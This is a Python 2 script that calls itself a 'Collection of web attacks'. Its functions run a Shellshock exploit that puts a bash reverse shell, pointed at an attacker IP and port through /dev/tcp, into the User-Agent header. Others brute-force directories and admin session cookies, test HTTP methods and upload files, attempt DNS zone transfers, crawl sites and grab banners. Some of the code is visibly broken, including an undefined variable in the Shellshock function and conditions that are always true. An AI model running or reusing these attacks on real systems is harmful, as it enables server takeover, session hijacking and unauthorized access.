'''
Collection of web attacks.
'''

import requests
import Queue
import urllib
import subprocess
import socket
from shlex import split
from HTMLParser import HTMLParser
from urlparse import urlparse


'''
Resume allows us to resume a brute-forcing session if our network connectivity is interrupted or the target site goes down.
'''
resume = None

def get_request(target):
	req = requests.get(target)
            
	if req.status_code != requests.codes.ok:
		raise ValueError("[!] Unable to connect to target.")
	else:
		print "[*] Successfully connected to target."


def shellshock(target, a_ip, a_port):
	s_shock = "() { :;}; /bin/bash -i >& /dev/tcp/{}/{} 0>&1".format(attacker, a_port)

	user_agent = s_shock

	headers = {'User-Agent': user_agent}

	req = requests.post(target, headers=headers)
	if req.status_code != requests.codes.ok:
		raise ValueError("[!] Unable to execute shellshock t(X_X)t")
	else:
		print("[+] Target shellshocked. Check your listener. \n")


def build_wordlist(wordlist_file):
	with open(wordlist_file, 'rb') as f:
		raw_words = f.readlines()
		f.close()

	found_resume = False
	words = Queue.Queue()
	
	for word in raw_words:
		word = word.rstrip()
		
		if resume is not None:
			if found_resume:
				words.put(word)
			else:
				if word == resume:
					found_resume = True
					print "[*] Resuming word list from: {}".format(resume)

		else:
			words.put(word)

	return words


def dir_fuzzer(url, word_queue, extensions=None):
	while not word_queue.empty():
		attempt = word_queue.get()

		attempt_list = []

		'''
		Checking to see if there is a file extension. If not, we know it's a 
		directory path we're brute-forcing.
		'''
		if "." not in attempt:
			attempt_list.append("/{}/".format(attempt))
		else:
			attempt_list.append("/{}".format(attempt))

		# Brute-forcing extensions
		if extensions:
			for extension in extensions:
				attempt_list.append("/{}{}".format(attempt, extension))

		# Iterating over our list of attempts
		for brute in attempt_list:
			url = "{}{}".format(url, urllib.quote(brute))

			try:
				req = requests.get(url)
				
				if req.status_code == requests.codes.ok:
					print "[{}] => {}".format(req.status_code, url)

			except:
				pass


def get_robots(target):
        req = requests.get(target + "/robots.txt")

	if req.status_code != requests.codes.ok:
		raise ValueError("[!] Unable to connect to target.")
	else:
		print "[*] Contents:\n"
		print req.text


def test_methods(target):
    req = requests.options(target)

    if req.status_code != requests.codes.ok:
        raise ValueError("[!] OPTIONS method not allowed.\n")

    else:
        print "[*] Allowed methods:\n"
        print req.content
        print

	# Prompting for file upload
	if req.content.find("PUT") != -1 or req.content.find("POST") != -1 or req.content.find("ok") != -1:
	    do = raw_input("Would you like to upload a file or quit the program?\n")
	    
	    if "Upload" or "upload" in do:
	        url = raw_input("Enter the URL to upload the file to: ")
	        f = raw_input("Enter the filepath of the file to upload: ")

		try:
		    req = requests.post(url, files=f)
		    print req.text
		    print 
		except:
		    print req.text
		    print 
		    pass

		try:
		    req = requests.put(url, files=f)
		    print req.text
		    print
		except:
		    print req.text
		    print
		    pass

	    else:
	   	print "Quitting now... \n"
		sys.exit(0)


def session_hijacker(target):
    exists = raw_input("Enter a string that only the admin receives once properly authenticated. (E.g., You are an admin.)\n: ")

    c_name = raw_input("Enter the cookie name. (E.g., PHPSESSID)\n: ")

    # Iterate over sessions and check if there's one with admin access
    for i in range(641):
        if i % 10 == 0:
            print "[*] Checked", str(i), "sessions."

        cookies = {c_name:str(i)}
        req = requests.get(target, cookies=cookies)

        # If the response page's contents contains the admin-only string
        if req.content.find(exists) != -1:
            print "[*] Admin session found:", str(i)
            print req.content
            print
            break

    print "[*] Successfully brute-forced admin session.\n"


def whois(target):
    try:
        bash_command = 'whois ' + target

        process = subprocess.Popen(bash_command.split(), stdout=subprocess.PIPE)
        output, error = process.communicate()
        print output

    except:
        print "\n[!] This functionality is only available in Unix and Linux systems.\n"


def zone_transfer(target):
    try:
        p1 = subprocess.Popen(split('host -t ns ' + target), stdout=subprocess.PIPE)
        p2 = subprocess.Popen(split('cut -d " " -f4'), stdin=p1.stdout, stdout=subprocess.PIPE)
        
        print "[*] Results:"

        for server in p2.stdout:
            p3 = subprocess.Popen(split('host -l ' + target + ' ' + server), stdin=p2.stdout, stdout=subprocess.PIPE)
            p4 = subprocess.Popen(split('grep "has address"'), stdin=p3.stdout, stdout=subprocess.PIPE)
            output, error = p4.communicate()
            print output
        
    except:
        print "\n[!] This functionality is only available in Unix and Linux systems.\n"


class LinkParser(HTMLParser):
    def handle_starttag(self, tag, attrs):
        if tag == 'a' or 'link':
            for (key, value) in attrs:
                if key == 'href':
                    # Grab the new URL
                    newUrl = "{}{}".format(self.baseUrl, value)
                    # Add it to collection
                    self.links += [newUrl]


    def get_links(self, url):
        self.links = []
        self.baseUrl = url
        cookies = {cookies1:cookies2}
        req = requests.get(url, cookies=cookies)

        if "text/html" in req.headers["Content-Type"]:
            content = req.content
            self.feed(content)

            return content, self.links
        
        else:
            return "", []


def spider(url, max_pages, word=""):
    global cookies1, cookies2

    cookies1 = raw_input("Enter the cookie name (Optional): ")
    cookies2 = raw_input("Enter the cookie value (Optional): ")

    target = [url]
    number_visited = 0
    found_word = False

    print "[*] Pages crawled through:\n"
    while number_visited < max_pages and target != [] and not found_word:
        number_visited += 1
        # Start from the beginning of our collection of pages to visit
        url = target[0]
        target = target[1:]

        try:
            print number_visited, url
            parser = LinkParser()
            data, links = parser.get_links(url)

            if data.find(word) > -1:
                found_word = True

            target += links

        except Exception as e:
            print "[!] Error:", e

    if found_word:
        print "\n[*] The word", word, "was found at:", url
        see = raw_input("Do you want to see the page content?\nAnswer: ")
        if see == "Yes" or "yes" or "Y" or "y":
            print "[*] Contents of the URL:", url
            print
            print data

    else:
        print "\n[!] Word '", word, "' was not found."


def banner_grab():
    website = raw_input("Enter the target website or IP address: ")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((website, 80))
    s.send('GET /\n\n')
    response = s.recv(1024)

    print
    print response


